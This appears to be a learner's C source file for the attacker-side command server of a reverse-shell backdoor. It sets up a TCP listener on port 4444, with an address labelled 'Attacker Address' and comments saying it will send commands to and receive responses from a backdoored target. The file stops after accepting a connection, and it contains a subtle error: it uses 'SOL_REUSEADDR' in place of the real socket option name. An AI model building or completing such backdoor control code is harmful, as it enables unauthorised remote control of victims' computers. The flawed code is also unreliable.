//Include nesscessery libraries.
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>//New
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>


//The server program capable of doing these things.
//Create a connection
//Send the commands
//Receive Response

//All function belongs to main funtion.

int main()
{
    ///Let's create wanted varibles needed for the program.
    //client_socket used for store once connection was established with client to the server.
    int sock, client_socket;

    //buffer to transport the command(argument).
    //response same as total response size of backdoor.
    char buffer[1024];
    char response[18384];

    //Let's import socket structure. > For our address and client address.
    //In backdoor program we specified sturcture for target address only here in server scenarion we specify server and clint as well.
    struct sockaddr_in server_address, client_address;


    int i = 0;
    int optval = 1;
    //Client socket length. 
    socklen_t client_length;


    //Let's Create socket object. and specfy that we're using IPV4 and TCP Connection(AFINET, SOCK_STREAM)
    sock = socket(AF_INET, SOCK_STREAM, 0);


    //Now will set some socket options
    //Using optval variable check the sock object options.
    //if the options fianl output is less than 0 zero it could lead to an error.
    if (setsockopt(sock, SOL_SOCKET, SOL_REUSEADDR, &optval, sizeof(optval)) < 0)
    {
        printf("Error Setting TCP Socket Option.\n");
        return 1;
    }

    //Now we set same options that we have set to backdoor socket elements.
    //IP, Port

    server_address.sin_family = AF_INET; //IPv4
    server_address.sin_addr.s_addr = inet_addr("10.0.0.0"); //Attacker Address
    server_address.sin_port = htons(4444);//Target port


    //Now server want to bind client and server ip.
    bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
    //Now will listen for incoming connection. want to listen in the socket and time that we want to except that is 5.
    listen(sock, 5);
    //Getting the size of client length.
    client_length = sizeof(client_address);
    //Accept the connection request. using accept function and storing the result in the client socket.
    client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);



}
